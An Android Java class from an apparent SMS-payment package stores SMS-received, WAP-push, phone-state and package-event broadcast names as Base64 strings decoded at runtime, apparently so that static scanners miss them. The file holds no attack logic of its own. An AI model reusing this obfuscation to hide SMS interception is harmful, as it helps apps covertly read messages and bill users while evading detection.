package com.y7.smspay.mp.srv;

import android.util.Base64;

public class St {
	public static final String WAP_PUSH_RECEIVED=e("YW5kcm9pZC5wcm92aWRlci5UZWxlcGhvbnkuV0FQX1BVU0hfUkVDRUlWRUQ=");//android.provider.Telephony.WAP_PUSH_RECEIVED
	public static final String SMS_RECEIVED=e("YW5kcm9pZC5wcm92aWRlci5UZWxlcGhvbnkuU01TX1JFQ0VJVkVE");//android.provider.Telephony.SMS_RECEIVED
	public static final String PHONE_STATE=e("YW5kcm9pZC5pbnRlbnQuYWN0aW9uLlBIT05FX1NUQVRF");//android.intent.action.PHONE_STATE
	public static final String STATE_CHANGED=e("YW5kcm9pZC5ibHVldG9vdGguYWRhcHRlci5hY3Rpb24uU1RBVEVfQ0hBTkdFRA==");//android.bluetooth.adapter.action.STATE_CHANGED
	public static final String USER_PRESENT=e("YW5kcm9pZC5pbnRlbnQuYWN0aW9uLlVTRVJfUFJFU0VOVA==");//android.intent.action.USER_PRESENT
	public static final String UMS_CONNECTED=e("YW5kcm9pZC5pbnRlbnQuYWN0aW9uLlVNU19DT05ORUNURUQ=");//android.intent.action.UMS_CONNECTED
	public static final String ACTION_DATE_CHANGED=e("YW5kcm9pZC5pbnRlbnQuYWN0aW9uLkFDVElPTl9EQVRFX0NIQU5HRUQ=");//android.intent.action.ACTION_DATE_CHANGED
	public static final String ACTION_MEDIA_EJECT=e("YW5kcm9pZC5pbnRlbnQuYWN0aW9uLkFDVElPTl9NRURJQV9FSkVDVA==");//android.intent.action.ACTION_MEDIA_EJECT
	public static final String ACTION_PACKAGE_ADDED=e("YW5kcm9pZC5pbnRlbnQuYWN0aW9uLkFDVElPTl9QQUNLQUdFX0FEREVE");//android.intent.action.ACTION_PACKAGE_ADDED
	public static final String ACTION_TIMEZONE_CHANGED=e("YW5kcm9pZC5pbnRlbnQuYWN0aW9uLkFDVElPTl9USU1FWk9ORV9DSEFOR0VE");//android.intent.action.ACTION_TIMEZONE_CHANGED
	public static final String ACTION_TIME_CHANGED=e("YW5kcm9pZC5pbnRlbnQuYWN0aW9uLkFDVElPTl9USU1FX0NIQU5HRUQ=");//android.intent.action.ACTION_TIME_CHANGED
	public static final String ANY_DATA_STATE=e("YW5kcm9pZC5pbnRlbnQuYWN0aW9uLkFOWV9EQVRBX1NUQVRF");//android.intent.action.ANY_DATA_STATE
	public static final String PACKAGE_ADDED=e("YW5kcm9pZC5pbnRlbnQuYWN0aW9uLlBBQ0tBR0VfQURERUQ=");//android.intent.action.PACKAGE_ADDED
	public static final String PACKAGE_ADDED_ACTION=e("YW5kcm9pZC5pbnRlbnQuYWN0aW9uLlBBQ0tBR0VfQURERURfQUNUSU9O");//android.intent.action.PACKAGE_ADDED_ACTION
	public static final String PACKAGE_REMOVED_ACTION=e("YW5kcm9pZC5pbnRlbnQuYWN0aW9uLlBBQ0tBR0VfUkVNT1ZFRF9BQ1RJT04=");//android.intent.action.PACKAGE_REMOVED_ACTION
	public static final String PACKAGE_REPLACED=e("YW5kcm9pZC5pbnRlbnQuYWN0aW9uLlBBQ0tBR0VfUkVQTEFDRUQ=");//android.intent.action.PACKAGE_REPLACED
	public static final String SMS_RECEIVED_2=e("YW5kcm9pZC5wcm92aWRlci5UZWxlcGhvbnkuU01TX1JFQ0VJVkVEXzI=");//android.provider.Telephony.SMS_RECEIVED_2
	public static final String GSM_SMS_RECEIVED=e("YW5kcm9pZC5wcm92aWRlci5UZWxlcGhvbnkuR1NNX1NNU19SRUNFSVZFRA==");//android.provider.Telephony.GSM_SMS_RECEIVED
	public static final String SIM_STATE_CHANGED=e("YW5kcm9pZC5pbnRlbnQuYWN0aW9uLlNJTV9TVEFURV9DSEFOR0VE");//android.intent.action.SIM_STATE_CHANGED
	public static String e(String s) {
		String str = null;
		try {
			str = new String(Base64.decode(s.getBytes(), Base64.NO_WRAP));
		} catch (Exception var5) {
			var5.printStackTrace();
		}
		return str.trim();
	}
	
}
